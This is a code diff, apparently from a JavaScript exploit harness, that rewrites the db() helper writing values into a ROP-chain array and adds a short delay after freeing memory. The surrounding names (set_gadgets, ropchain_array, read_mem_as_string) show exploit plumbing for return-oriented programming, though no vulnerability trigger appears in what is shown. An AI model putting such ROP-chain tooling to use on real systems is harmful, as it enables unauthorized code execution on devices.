@@ -21,11 +21,19 @@ function set_gadgets(l) {
         i++;
     }
 }
-function db(data)
-{
-    for(var i = 0; i < data.length; i++)
-        ropchain_array[ropchain_offset++] = data[i];
+function db(data) {
+    ropchain_array.set ? ropchain_array.set(data, ropchain_offset)
+        : Array.prototype.splice.apply(
+            ropchain_array,
+            [ropchain_offset, data.length].concat(data)
+        );
+    ropchain_offset += data.length;
 }
+// function db(data)
+// {
+//     for(var i = 0; i < data.length; i++)
+//         ropchain_array[ropchain_offset++] = data[i];
+// }
 var main_ret = malloc(8);
 var printf_buf = malloc(65536);
 var __swbuf_addr = 0; ropchain_offset = 2;
@@ -8571,6 +8579,7 @@ var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
     var _ = malloc_nogc.pop();
     var _ = malloc_nogc.pop();
     var _ = malloc_nogc.pop();
+    await new Promise(resolve => setTimeout(resolve, 50));
     if ( main_ret == 0 || main_ret == 81) 
         return 0;
     else 
